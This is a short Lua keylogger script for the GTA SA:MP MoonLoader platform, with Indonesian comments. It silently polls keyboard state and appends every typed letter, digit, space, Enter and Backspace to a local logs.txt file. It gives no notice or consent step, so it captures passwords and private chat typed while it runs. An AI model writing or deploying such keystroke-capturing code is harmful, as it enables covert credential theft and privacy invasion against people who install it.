require "lib.moonloader"  -- Memuat library utama Moonloader
local keys = require "vkeys" -- Library yang berisi daftar kode tombol (VK_*)

-- Variabel untuk mencatat status tombol sebelumnya, agar tidak menulis berulang kali
local lastKeyState = {}

function main()
    while not isSampAvailable() do wait(100) end
    while true do
        wait(10) -- Jeda 10ms agar tidak membebani CPU
        -- Iterasi untuk memeriksa tombol: Backspace, Enter, Space, 0-9, A-Z, Numpad 0-9
        for i = 8, 222 do
            local isValidKey = (i == 8 or i == 13 or i == 32) or (i >= 48 and i <= 57) or (i >= 65 and i <= 90) or (i >= 96 and i <= 105)
            if isValidKey then
                local currentState = isKeyDown(i)
                -- Jika tombol sedang ditekan dan sebelumnya tidak ditekan
                if currentState and not lastKeyState[i] then
                    local char = ""
                    if i >= 65 and i <= 90 then -- Huruf A-Z
                        -- Cek apakah tombol Shift ditekan untuk uppercase/lowercase
                        local shift = isKeyDown(0x10) or isKeyDown(0xA0) or isKeyDown(0xA1) -- VK_SHIFT, VK_LSHIFT, VK_RSHIFT
                        if shift then
                            char = string.char(i)
                        else
                            char = string.char(i):lower()
                        end
                    elseif i >= 48 and i <= 57 then -- Angka 0-9
                        char = string.char(i)
                    elseif i >= 96 and i <= 105 then -- Numpad 0-9
                        char = tostring(i - 96)
                    elseif i == 32 then -- Spacebar
                        char = " "
                    elseif i == 13 then -- Enter
                        char = "[ENTER]\n"
                    elseif i == 8 then -- Backspace
                        char = "[BACKSPACE]"
                    end
                    
                    if char ~= "" then
                        -- Tulis ke file log secara horizontal
                        local logFile = io.open(getGameDirectory() .. "\\moonloader\\logs.txt", "a")
                        if logFile then
                            logFile:write(char)
                            logFile:close()
                        end
                    end
                    lastKeyState[i] = true
                elseif not currentState and lastKeyState[i] then
                    lastKeyState[i] = false
                end
            end
        end
    end
end